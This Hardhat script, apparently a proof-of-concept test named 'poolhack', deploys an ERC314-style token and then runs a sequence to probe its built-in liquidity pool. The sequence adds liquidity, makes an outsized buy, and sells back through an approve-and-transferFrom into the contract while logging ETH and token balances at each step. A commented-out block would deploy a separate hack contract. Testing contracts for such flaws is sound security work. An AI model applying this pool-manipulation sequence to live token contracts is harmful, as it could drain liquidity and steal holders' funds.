// npx hardhat run scripts/poolhack/t_poolhack.js --network dev
// npx hardhat run scripts/poolhack/t_poolhack.js --network hardhat
// npx hardhat run scripts/poolhack/t_poolhack.js --network zhaomei
// npx hardhat run scripts/poolhack/t_poolhack.js --network mzhaomei
const hre = require("hardhat");
const { writer_info, writer_info_all, writer_info_all_proxy } = require('../tool/hh_log.js');
const { getcontractinfo } = require('../tool/id-readcontracts.js');
const { WITHDRAW_loc_getsign } = require("../tool/sign/loc_getsign.js");
const { erc20_loc_getsign, zero_getsign } = require("../tool/sign/loc_getsign");
var contractinfo = new Object();
async function main() {
    var [owner, addr1, addr2, addr3] = await ethers.getSigners();
    {
        {//部署UIN314
            var UNI314 = await ethers.deployContract("UNI314");
            await UNI314.waitForDeployment();
            await writer_info_all(
                network,
                await artifacts.readArtifact("UNI314"),
                UNI314, []
            );
            await UNI314.setMaxWallet("21000000000000000000000000");
            console.log("befor",{
                "addr1 e_balance": await ethers.provider.getBalance(addr1),
                "addr1 t_balance": await UNI314.balanceOf(addr1),
                "pool e_balance": await ethers.provider.getBalance(UNI314),
                "pool t_balance": await UNI314.balanceOf(UNI314),
            });
            await UNI314.addLiquidity(2 ** 31, { value: ethers.parseEther("1") });

            console.log("addLiquidity", {
                "addr1 e_balance": await ethers.provider.getBalance(addr1),
                "addr1 t_balance": await UNI314.balanceOf(addr1),
                "pool e_balance": await ethers.provider.getBalance(UNI314),
                "pool t_balance": await UNI314.balanceOf(UNI314),
            });
            let ethamount = (await ethers.provider.getBalance(UNI314))*50n;
            await addr1.sendTransaction({
                to: UNI314,
                value: ethamount, // 1 ether
            });
            console.log("buy", {
                "addr1 e_balance": await ethers.provider.getBalance(addr1),
                "addr1 t_balance": await UNI314.balanceOf(addr1),
                "pool e_balance": await ethers.provider.getBalance(UNI314),
                "pool t_balance": await UNI314.balanceOf(UNI314),
            });
            let t_amount = await UNI314.balanceOf(addr1)
            await UNI314.connect(addr1).approve(addr2, t_amount);
            await UNI314.connect(addr2).transferFrom(addr1,UNI314,t_amount);
            console.log("sell", {
                "addr1 e_balance": await ethers.provider.getBalance(addr1),
                "addr1 t_balance": await UNI314.balanceOf(addr1),
                "pool e_balance": await ethers.provider.getBalance(UNI314),
                "pool t_balance": await UNI314.balanceOf(UNI314),
            });

        }
        // {//hack
        //     {//部署poolhack
        //         var poolhack = await ethers.deployContract("poolhack");
        //         await poolhack.waitForDeployment();
        //         await writer_info_all(
        //             network,
        //             await artifacts.readArtifact("poolhack"),
        //             poolhack, []
        //         );
        //     }
        // }
    }
}


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

function convertBigIntsToJSON(obj) {
    if (typeof obj === 'bigint') {
        return obj.toString();
    } else if (Array.isArray(obj)) {
        return obj.map(item => convertBigIntsToJSON(item));
    } else if (typeof obj === 'object' && obj !== null) {
        const newObj = {};
        for (const key in obj) {
            newObj[key] = convertBigIntsToJSON(obj[key]);
        }
        return newObj;
    } else {
        return obj;
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function serializeBigInt(data) {
    return JSON.stringify(data, (_, value) =>
        typeof value === 'bigint'
            ? value.toString()
            : value
    );
}


async function decimal2big(token, value) {
    return BigInt(Math.floor(value * (10 ** Number(await token.decimals()))))
}
async function decimal2show(token, value) {
    return Math.floor(Number(value / (10n ** await token.decimals())))
}

async function predictContractAddress(deployerAddress, deployerNonce) {
    const rlp = require('rlp');
    const keccak = require('keccak');

    // RLP encode the sender address and nonce
    const encoded = rlp.encode([deployerAddress, deployerNonce]);

    // Hash the encoded data
    const hash = keccak('keccak256').update(encoded).digest('hex');

    // Take the last 20 bytes as the address
    const contractAddress = `0x${hash.slice(24)}`;
    return contractAddress;
}